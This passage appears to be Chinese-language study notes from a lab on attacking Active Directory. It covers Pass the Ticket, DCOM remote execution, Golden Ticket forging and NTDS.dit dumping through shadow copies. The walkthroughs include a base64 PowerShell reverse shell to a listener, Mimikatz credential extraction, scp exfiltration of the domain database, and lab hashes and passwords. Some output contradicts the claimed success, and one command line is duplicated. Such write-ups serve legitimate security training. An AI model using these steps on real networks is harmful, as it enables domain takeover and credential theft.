`Ticket #1`: TGS（Ticket Granting Service），用於存取 FILES04 的 CIFS（檔案共享服務）。

#### 4. 使用 Kerberos ticket 存取目標機器
使用 [PsExec](#PsExec) 來執行遠端命令，因為它依賴 Kerberos 來驗證
```
PS C:\Windows\system32> cd C:\tools\SysinternalsSuite\
PS C:\tools\SysinternalsSuite> .\PsExec.exe \\files04 cmd

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
corp\jen

C:\Windows\system32>hostname
FILES04
```

>[!Important]
>**Overpass the Hash（PtK） VS Pass the Hash（PtH）**\
>![image](https://hackmd.io/_uploads/B1yFXxg3ye.png)

### Pass the Ticket
Pass the Ticket（PtT） 利用已獲取的 Kerberos service ticket（TGS）存取受保護資源，與 Overpass the Hash（PtK） 最大的不同：
- PtK 透過 NTLM Hash 來請求新的 Kerberos TGT，然後存取服務
- PtT 直接使用已存在的 TGS，無需進行 NTLM 認證或請求新的 TGT

PtT 可以繞過 NTLM，但只限使用 Kerberos 驗證來存取目標資源

>[!Note]
>Pass the Ticket 滿足條件：
>- 目標使用者（如 dave）已經在系統上登入，並且產生了 Kerberos service ticket（TGS）。
>- 擁有 SYSTEM 權限，能夠存取 LSASS 來提取 ticket（例如透過 Mimikatz）。
>- 可以將提取的 TGS 重新注入到自己的 session 中，從而模擬目標使用者。

[範例環境]\

使用 `jen` 嘗試存取 WEB04 伺服器，將濫用 dave 的現有 session。dave 有權存取位於 WEB04 上的備份資料夾，而我們的登入使用者jen沒有。
#### 1. 確認目前使用者無法存取受限資源
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /cert-ignore /u:jen  /p:Nexus123! /v:192.168.170.74
```
```
PS C:\Users\jen\Desktop> whoami
corp\jen
PS C:\Users\jen\Desktop> ls \\web04\backup
ls : Access is denied
At line:1 char:1
+ ls \\web04\backup
...
```
> 表示 jen 沒有權限存取 backup 共享資料夾

#### 2. 提取當前記憶體中的 Kerberos ticket
使用 Mimikatz 來匯出系統記憶體中所有的 Kerberos TGT/TGS:
```
PS C:\Windows\system32> cd C:\Tools\
PS C:\Tools> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::tickets /export

Authentication Id : 0 ; 9257415 (00000000:008d41c7)
Session           : Interactive from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 3/13/2025 12:01:41 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 3/13/2025 12:01:41 AM ; 3/13/2025 10:01:41 AM ; 3/20/2025 12:01:41 AM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; corp ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM ( corp )
           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             c69b596b7721c388ce399eb8361c41de4a529e56b582288c9b7987862a430ee7
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;8d41c7]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi !
```
>已成功匯出記憶體中 [LSASS](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)  process 空間中的 TGT/TGS，匯出成 `.kirbi` 檔案

利用 `dir *.kirbi` 檢查匯出的 TGT 與 TGS
```
PS C:\Tools> dir *.kirbi

    Directory: C:\Tools

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/12/2025  11:50 PM           1567 [0;2be743]-0-0-40a10000-jen@cifs-web04.kirbi
...
-a----         3/13/2025  12:17 AM           1563 [0;3e7]-2-1-40e10000-CLIENT74$@krbtgt-CORP.COM.kirbi
-a----         3/13/2025  12:17 AM           1521 [0;8d41c7]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
-a----         3/13/2025  12:17 AM           1577 [0;8d4217]-0-0-40810000-dave@cifs-web04.kirbi
-a----         3/13/2025  12:17 AM           1611 [0;8d4217]-0-1-40850000-dave@LDAP-DC1.corp.com.kirbi
-a----         3/13/2025  12:17 AM           1521 [0;8d4217]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
```

#### 3. 在 session 中注入 ticket
選擇 `dave@cifs-web04.kirbi` 格式的任何 TGS 票證，並透過`kerberos::ptt` 指令將其註入 mimikatz 

>[!Tip]
>dave 相關的 `*.kirbi` 有：\
>`[0;8d41c7]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi`\
`[0;8d4217]-0-0-40810000-dave@cifs-web04.kirbi`\
`[0;8d4217]-0-1-40850000-dave@LDAP-DC1.corp.com.kirbi`\
>>為什麼選擇 `[0;8d4217]-0-0-40810000-dave@cifs-web04.kirbi` ?而不是其他 kirbi ticket?\
>>Ans: 現在要利用 TGS 存取 CIFS
>>- dave@krbtgt-CORP.COM.kirbi（TGT）\
>>❌ 這是 TGT，只能用來請求 TGS，不能直接存取 WEB04。\
>>❌ 如果要使用 TGT，還需要額外請求 TGS，這可能會被 SIEM 監控到。
>>- dave@LDAP-DC1.corp.com.kirbi（TGS）\
❌ 這個 TGS 票證適用於 LDAP 服務，而不是 CIFS 檔案共享。\
❌ 即使注入這個票證，也無法存取 WEB04。

將 dave 在 WEB04 的 TGS ticket 注入到 jen 的 session
```
mimikatz # kerberos::ptt [0;8d4217]-0-0-40810000-dave@cifs-web04.kirbi

* File: '[0;8d4217]-0-0-40810000-dave@cifs-web04.kirbi': OK
```

#### 4. 驗證票證是否成功注入
`klist` 檢查當前 session 中的 Kerberos ticket
```
PS C:\Tools> klist

Current LogonId is 0:0x2be743

Cached Tickets: (1)

#0>     Client: dave @ CORP.COM
        Server: cifs/web04 @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40810000 -> forwardable renewable name_canonicalize
        Start Time: 3/13/2025 0:02:47 (local)
        End Time:   3/13/2025 10:01:41 (local)
        Renew Time: 3/20/2025 0:01:41 (local)
        Session Key Type: Kerberos DES-CBC-CRC
        Cache Flags: 0
        Kdc Called:
```

#### 5. 嘗試存取目標
```
PS C:\Tools> ls \\web04\backup

    Directory: \\web04\backup

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/13/2022   2:52 AM              0 backup_schemata.txt
-a----         3/12/2025  10:58 PM             78 flag.txt
```
> 成功偽裝成 dave，並存取 WEB04\backup 共享資料夾

>[!Important]
>**Pass the Hash（PtH) vs.Pass the Ticket（PtT） vs. Overpass the Hash（PtK)**\
>![image](https://hackmd.io/_uploads/rkPhfMe2Je.png)

### DCOM
>[!Note]
>**COM 與 DCOM**
>- COM（[Component Object Model](https://msdn.microsoft.com/en-us/library/windows/desktop/ms680573(v=vs.85).aspx)）: 是
>Microsoft 開發的一種技術，用於讓應用程式內部的不同元件互相溝通，最早用於 同一台機器上的應用程式交互。
>- DCOM（[Distributed Component Object Model](https://msdn.microsoft.com/en-us/library/cc226801.aspx)）:
> COM 的延伸，允許不同電腦透過網路進行 COM 物件的交互，這讓應用程式可以透過 RPC（遠端程序呼叫） 在多台機器間運行。

DCOM 透過 RPC（TCP 135）進行通訊，需要本機管理員權限才能存取 DCOM Service Control Manager (SCM)，本質上是一個 API。

DCOM 橫向移動是基於用於 Windows 系統腳本自動化的 [Microsoft Management Console](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/microsoft-management-console-start-page)(MMC) COM 應用程式。\
MMC 應用程式類別允許建立  [Application Objects](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/application-object?redirectedfrom=MSDN)，該對象公開 Document.ActiveView 屬性下的 ExecuteShellCommand method。這是 local administrators 的預設設定，允許經過身份驗證的使用者在獲得授權後執行任何 shell 命令，。

>[!Important]
利用 MMC20.Application.1 這個 COM Object 來遠端執行命令：\
透過 ExecuteShellCommand 可執行 cmd.exe 或 PowerShell 指令。

[情境範例]
- 目前已經掌控 CLIENT74（Windows 11），並以 jen 身份登入。
- 目標機器是 FILES04（IP: 192.168.170.73）。
- 目標機器上啟用了 DCOM，且 jen 具有管理員權限。

#### 1. 透過 PowerShell 遠端建立 DCOM Object
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /cert-ignore /u:jen  /p:Nexus123! /v:192.168.170.74
```
在 CLIENT74 上開啟 Administrator 的 PowerShell，建立了一個遠端的 MMC 2.0 Application Object
```
PS C:\Windows\system32> $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.170.73"))
```
> `"MMC20.Application.1"`: MMC 應用的 ProgID\
`"192.168.50.73"`: 目標機器 FILES04 的 IP
#### 2. 透過 DCOM 遠端執行 cmd.exe
```
PS C:\Windows\system32> $dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```
> `"cmd"`：執行 cmd.exe\
`/c calc`：指示 cmd.exe 執行 calc\
`"7"`：控制視窗狀態，7 代表最小化執行\
>>FILES04 會在 Session 0 啟動 calc.exe，但因為是服務模式，無法直接在桌面上看到

可在 FILES04 上檢查是否成功
```
C:\Users\Administrator>tasklist | findstr "calc"
win32calc.exe                 4764 Services                   0     12,132 K
```
#### 3. 使用 DCOM 執行 Reverse Shell
產生 Base64 編碼的 PowerShell Reverse Shell payload
```
┌──(chw㉿CHW)-[~/Tools]
└─$ python3 WMI_reverseshell.py
powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOAA1ACIALAA4ADgAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==

```
DCOM 執行
```
PS C:\Windows\system32> $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOAA1ACIALAA4ADgAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==","7")
```
(Kali)
```
┌──(chw㉿CHW)-[~/Tools]
└─$ nc -nvlp 8888                      
listening on [any] 8888 ...
connect to [192.168.45.185] from (UNKNOWN) [192.168.170.73] 65097

PS C:\Windows\system32> whoami
corp\jen
PS C:\Windows\system32> hostname
FILES04

PS C:\Windows\system32> 

```
## Active Directory Persistence
Persistence（持久性） 是指當我們在取得初始存取權限後，建立機制確保長期存取目標系統或網域，即使：系統重新啟動、使用者變更密碼、部分惡意程式被移除，也不會失去對目標網路的控制。
### Golden Ticket
>[!Important]
>Golden Ticket Attack:
>- Kerberos 認證流程：
>1. 使用者請求 TGT（Ticket Granting Ticket）。
>2. KDC（Key Distribution Center）使用 krbtgt 帳號的密碼雜湊（NTLM Hash）來加密 TGT。
>3. 這張 TGT 被使用者用來請求存取不同服務（TGS, Ticket Granting Service）。
>- Golden Ticket 攻擊：
如果能取得 krbtgt 的 NTLM Hash，則可以 `自行產生 TGT`，並宣稱 任何帳號擁有最高權限。\
由於 TGT 是用 krbtgt 的密碼雜湊加密的，所以 Domain Controller（DC）會信任這張票證，無論這張票證是否合法。\
>自己創建我們 TGT，就稱為 Golden Ticket

也因為 krbtgt 密碼不會自動變更，所以可以長期使用 Golden Ticket 繞過所有帳戶密碼變更

#### 1. 測試目前使用者無法存取 Domain Controller
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /cert-ignore /u:jen  /p:Nexus123! /v:192.168.136.74
```
在 CLIENT74 使用 PsExec 嘗試登入 DC1
```
PS C:\Tools\SysinternalsSuite> .\PsExec64.exe \\DC1 cmd.exe

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

Couldn't access DC1:
Access is denied.
```
#### 2. 取得 krbtgt NTLM Hash
>[!Important]
必須擁有 Domain Admin 權限 或 控制 Domain Controller

改用 `jeffadmin` 在 DC1 上使用 Mimikatz 提取 krbtgt NTLM Hash
```
┌──(chw㉿CHW)-[~/Tools]
└─$ xfreerdp /cert-ignore /u:jeffadmin /d:corp.com /p:BrouhahaTungPerorateBroom2023! /v:192.168.136.70
```
```
PS C:\Tools> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::lsa /patch
Domain : CORP / S-1-5-21-1987370270-658905905-1781884369

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 2892d26cdf84d7a70e2eb3b9f05c425e

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 1693c6cefafffc7af11ef34d1c788f47
```
>取得 krbtgt 的 NTLM Hash：`1693c6cefafffc7af11ef34d1c788f47`

#### 2. 清除現有 Kerberos 票證
返回 jen RDP 的 CLIENT74
```
PS C:\Windows\system32> cd C:\Tools\
PS C:\Tools> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::purge
Ticket(s) purge for current session is OK
```
> 清除現有的 Kerberos ticket，確保不影響新的 Golden Ticket 注入

#### 3. 生成 Golden Ticket
使用 Mimikatz 創建 TGT：\
使用 `/krbtgt` 而不是 `/rc4` 來表示我們提供 krbtgt 用戶的密碼雜湊
![image](https://hackmd.io/_uploads/rJSGoNl2kg.png)
```
mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
User      : jen
Domain    : corp.com
ServiceKey: 1693c6cefafffc7af11ef34d1c788f47 - rc4_hmac_nt
Lifetime  : 3/13/2025 4:00:51 AM ; 3/11/2035 4:00:51 AM ; 3/11/2035 4:00:51 AM
-> Ticket : ** Pass The Ticket **

 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'jen @ corp.com' successfully submitted for current session
```
> jen 現在擁有完整 Domain Admin 權限

#### 4. 使用 PsExec 登入 Domain Controller
```
PS C:\Tools\SysinternalsSuite> .\PsExec.exe \\dc1 cmd.exe

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

Couldn't access dc1:
Invalid Signature.
PS C:\Tools\SysinternalsSuite> hostname
client74
PS C:\Tools\SysinternalsSuite> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::80d9:bf05:fca1:baf5%6
   IPv4 Address. . . . . . . . . . . : 192.168.136.74
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.136.254
```
> jen 成功取得 DC1 的存取權限

#### 5. 驗證是否成功加入 Domain Admin

```
C:\Windows\system32>whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes    
=========================================== ================ ============================================ ===============================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                      Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
CORP\Domain Admins                          Group            S-1-5-21-1987370270-658905905-1781884369-512 Mandatory group, Enabled by default, Enabled group
...
```
> jen 已變成 Domain Admins 群組 member

#### - PsExec 指定 IP 會失敗
>[!Caution]
>如果使用 PsExec 指定 IP（強迫 NTLM）則攻擊會失敗

```
C:\Tools\SysinternalsSuite> psexec.exe \\192.168.136.70 cmd.exe

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

Couldn't access 192.168.136.70:
Access is denied.
```
>[!Important]
>必須透過主機名稱來觸發 Kerberos 驗證
```
C:\Tools\SysinternalsSuite> psexec.exe \\dc1 cmd.exe
```
### Shadow Copies
離線提取所有使用者的 NTLM Hash 和 Kerberos 金鑰，進而進行 密碼破解、Pass-the-Hash、Golden Ticket attack
>[!Note]
>**Shadow Copy**:\
>[Shadow Copy](https://en.wikipedia.org/wiki/Shadow_Copy)（Volume Shadow Service, VSS） 是 微軟內建的備份技術，允許建立文件或整個磁碟的快照，主要用於：
>- 系統備份
>- 還原舊版本的文件
>- 容錯恢復
>
>可濫用 Shadow Copy 來 複製 Active Directory 資料庫  [NTDS.dit](https://technet.microsoft.com/en-us/library/cc961761.aspx)，並透過工具 離線提取所有使用者的密碼 Hash。

Microsoft signed binary [vshadow.exe](https://learn.microsoft.com/en-us/windows/win32/vss/vshadow-tool-and-sample) is offered as part of the [Windows SDK](https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/).

>[!Important]
目標: 複製 NTDS.dit 資料庫並提取 AD 使用者的密碼 Hash\
需滿足條件：\
>1. 擁有 Domain Admin 權限
>2. 需要在 Domain Controller 上操作

#### 1. 創建 Shadow Copy
以 jeffadmin 登入 DC1 網域控制站
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /cert-ignore /u:jeffadmin /d:corp.com /p:BrouhahaTungPerorateBroom2023! /v:192.168.136.70
```
```
PS C:\Tools> .\vshadow.exe -nw -p C:

VSHADOW.EXE 3.0 - Volume Shadow Copy sample client.
Copyright (C) 2005 Microsoft Corporation. All rights reserved.


(Option: No-writers option detected)
(Option: Persistent shadow copy)
(Option: Create shadow copy set)
- Setting the VSS context to: 0x00000019
Creating shadow set {0d109c76-1214-4bb4-ac61-eab7c5547bce} ...
- Adding volume \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\] to the shadow set...
Creating the shadow (DoSnapshotSet) ...
(Waiting for the asynchronous operation to finish...)
Shadow copy set succesfully created.

List of created shadow copies:


Querying all shadow copies with the SnapshotSetID {0d109c76-1214-4bb4-ac61-eab7c5547bce} ...

* SNAPSHOT ID = {a05b566d-52fa-413a-add4-5ea80ebc1fd5} ...
   - Shadow copy Set: {0d109c76-1214-4bb4-ac61-eab7c5547bce}
   - Original count of shadow copies = 1
   - Original Volume name: \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\]
   - Creation Time: 3/13/2025 7:22:32 AM
   - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
   - Originating machine: DC1.corp.com
   - Service machine: DC1.corp.com
   - Not Exposed
   - Provider id: {b5946137-7b9f-4925-af80-51abd60b20d5}
   - Attributes:  No_Auto_Release Persistent No_Writers Differential


Snapshot creation done.
```
>`-nw`:	No Writers, 不通知 VSS Writers，直接建立 Shadow Copy，加速備份（不保證資料一致性）\
`-p`: Persistent（持久性）, Shadow Copy 不會自動刪除，可手動存取和複製檔案\
`C`: 目標磁碟（此指令建立 C 槽的Shadow Copy）
>> Shadow copy device name: `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2`

#### 2. 複製 Active Directory 資料庫
將 Shadow Copy 中的 NTDS.dit（AD database） 複製到 `C:\`：
```
PS C:\Tools> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
```
#### 3. 複製 SYSTEM Hive
NTDS.dit 被加密，需要從 Windows registry 中 SYSTEM Hive 來解密：
```
PS C:\Tools> cd /
PS C:\> reg.exe save hklm\system c:\system.bak
The operation completed successfully.
```
#### 4. 檔案轉移到 Kali
```
┌──(chw㉿CHW)-[~]
└─$ sudo systemctl start ssh
[sudo] password for chw: 
```
```
PS C:\> scp C:\ntds.dit.bak C:\system.bak chw@192.168.45.235:~/
```
#### 5. 在 Kali 上提取 NTLM Hash
```
┌──(chw㉿CHW)-[~]
└─$ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0xbbe6040ef887565e9adb216561dc0620
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 98d2b28135d3e0d113c4fa9d965ac533
[*] Reading and decrypting hashes from ntds.dit.bak
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC1$:1000:aad3b435b51404eeaad3b435b51404ee:eda4af1186051537c77fa4f53ce2fe1a:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::
dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
stephanie:1104:aad3b435b51404eeaad3b435b51404ee:d2b35e8ac9d8f4ad5200acc4e0fd44fa:::
jeff:1105:aad3b435b51404eeaad3b435b51404ee:2688c6d2af5e9c7ddb268899123744ea:::
jeffadmin:1106:aad3b435b51404eeaad3b435b51404ee:e460605a9dbd55097c6cf77af2f89a03:::
iis_service:1109:aad3b435b51404eeaad3b435b51404ee:4d28cf5252d39971419580a51484ca09:::
WEB04$:1112:aad3b435b51404eeaad3b435b51404ee:87db4a6147afa7bdb46d1ab2478ffe9e:::
FILES04$:1118:aad3b435b51404eeaad3b435b51404ee:d75ffc4baaeb9ed40f7aa12d1f57f6f4:::
CLIENT74$:1121:aad3b435b51404eeaad3b435b51404ee:5eca857673356d26a98e2466a0fb1c65:::
CLIENT75$:1122:aad3b435b51404eeaad3b435b51404ee:b57715dcb5b529f212a9a4effd03aaf6:::
pete:1123:aad3b435b51404eeaad3b435b51404ee:369def79d8372408bf6e93364cc93075:::
jen:1124:aad3b435b51404eeaad3b435b51404ee:369def79d8372408bf6e93364cc93075:::
CLIENT76$:1129:aad3b435b51404eeaad3b435b51404ee:6f93b1d8bbbe2da617be00961f90349e:::
[*] Kerberos keys from ntds.dit.bak
Administrator:aes256-cts-hmac-sha1-96:56136fd5bbd512b3670c581ff98144a553888909a7bf8f0fd4c424b0d42b0cdc
Administrator:aes128-cts-hmac-sha1-96:3d58eb136242c11643baf4ec85970250
Administrator:des-cbc-md5:fd79dc380ee989a4
DC1$:aes256-cts-hmac-sha1-96:fb2255e5983e493caaba2e5693c67ceec600681392e289594b121dab919cef2c
DC1$:aes128-cts-hmac-sha1-96:68cf0d124b65310dd65c100a12ecf871
DC1$:des-cbc-md5:f7f804ce43264a43
krbtgt:aes256-cts-hmac-sha1-96:e1cced9c6ef723837ff55e373d971633afb8af8871059f3451ce4bccfcca3d4c
krbtgt:aes128-cts-hmac-sha1-96:8c5cf3a1c6998fa43955fa096c336a69
krbtgt:des-cbc-md5:683bdcba9e7c5de9
...
[*] Cleaning up...
```
>`impacket-secretsdump`: 專門用來 提取 NTLM Hash、Kerberos 金鑰\
`-ntds ntds.dit.bak`: 指定 AD 資料庫 ntds.dit.bak\
`-system system.bak`: 指定 SYSTEM Hive（HKLM\SYSTEM），用於解密 ntds.dit 中的密碼 Hash\
`LOCAL`: 表示 在本機解析 ntds.dit，而非透過遠端存取 AD（例如 -target 模式）

顯示 AD 內所有使用者的 NTLM Hash 後：
- 破解 NTLM Hash（Hashcat, John the Ripper）
- 進行 Pass-the-Hash 
- 偽造 Golden Ticket


